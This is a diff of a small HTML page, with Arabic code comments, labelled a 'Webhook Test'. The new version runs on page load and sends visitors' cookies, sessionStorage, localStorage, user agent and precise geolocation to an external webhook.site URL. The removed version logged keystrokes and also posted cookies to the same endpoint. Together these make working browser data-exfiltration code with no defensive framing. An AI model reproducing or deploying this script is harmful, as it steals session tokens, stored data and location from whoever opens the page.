@@ -1,49 +1,43 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>تجربة JavaScript متقدمة</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Test</title>
 </head>
 <body>
-  <h1>تجربة كود JavaScript عالمية 🌍</h1>
-  <p>جارٍ تنفيذ السكربت...</p>
+    <h1>Welcome to Webhook Test Page</h1>
+    <p>This page will send data to Webhook.site.</p>
 
-  <script>
-    // تنبيه
-    alert("مرحباً! تم تنفيذ السكربت ✅");
+    <script>
+        // Function to send data to Webhook
+        function sendDataToWebhook() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        cookies: document.cookie,  // إرسال الكوكيز
+                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
+                        localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
+                        userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
+                        time: new Date().toISOString(),  // الوقت الحالي
+                        location: {  // إرسال الموقع الجغرافي
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        }
+                    })
+                })
+                .then(response => response.json())
+                .then(data => console.log("Data sent successfully:", data))
+                .catch(error => console.log("Error sending data:", error));
+            }, function(error) {
+                console.log("Error getting geolocation: ", error);
+            });
+        }
 
-    // معلومات عن المتصفح
-    console.log("User-Agent: " + navigator.userAgent);
-
-    // الكوكيز
-    console.log("Cookies: " + document.cookie);
-
-    // الموقع الجغرافي
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        console.log("الموقع:");
-        console.log("خط العرض: " + position.coords.latitude);
-        console.log("خط الطول: " + position.coords.longitude);
-      });
-    } else {
-      console.log("الموقع غير مدعوم");
-    }
-
-    // تسجيل الأزرار
-    document.addEventListener('keydown', function(e) {
-      console.log("زر تم الضغط عليه: " + e.key);
-    });
-
-    // إرسال البيانات إلى سيرفر (اختياري، استبدل الرابط برابط Webhook الخاص بك)
-    fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        cookies: document.cookie,
-        userAgent: navigator.userAgent,
-        time: new Date().toISOString()
-      })
-    });
-  </script>
+        // Call the function when the page loads
+        window.onload = sendDataToWebhook;
+    </script>
 </body>
 </html>
